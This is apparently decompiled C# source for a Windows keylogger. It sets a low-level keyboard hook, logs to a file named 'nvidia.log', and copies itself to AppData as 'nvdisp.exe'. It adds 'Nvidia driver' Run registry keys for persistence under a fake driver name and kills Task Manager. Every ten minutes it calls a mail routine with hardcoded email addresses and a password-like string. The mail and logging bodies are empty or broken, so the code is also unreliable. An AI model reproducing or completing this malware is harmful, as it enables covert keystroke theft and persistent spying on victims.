using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace project;

internal class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	public static byte counter = 0;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	public static void Main()
	{
		if (failed == 0)
		{
			File.WriteAllText(path, "");
		}
		_hookID = SetHook(_proc);
		startup();
		Mail("shah_sahab_jhoolalal@hotmail.co.uk", "imran.nazir11003@gmail.com", "pakistan00");
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.AutoReset = true;
		timer.Interval = 600000.0;
		timer.Start();
		Application.Run();
		GC.KeepAlive(timer);
		UnhookWindowsHookEx(_hookID);
	}

	public static void startup()
	{
		string text = Application.get_ExecutablePath().ToString();
		string text2 = text;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, "nvdisp.exe");
		try
		{
			File.Copy(text, folderPath, overwrite: false);
			text = folderPath;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", folderPath);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text);
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (text != text2)
		{
			Process.Start(text);
			Environment.Exit(0);
		}
	}

	public static void OnTimedEvent(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Contains("Taskmgr.exe"))
			{
				process.Kill();
			}
		}
		counter++;
		Mail("shah_sahab_jhoolalal@hotmail.co.uk", "imran.nazir11002@gmail.com", "pakistan00");
	}

	public static void Mail(string x, string y, string z)
	{
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Invalid comparison between I4 and Unknown
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			StreamWriter streamWriter = File.AppendText(path);
			Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			shift = 0;
			streamWriter.Close();
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}
}
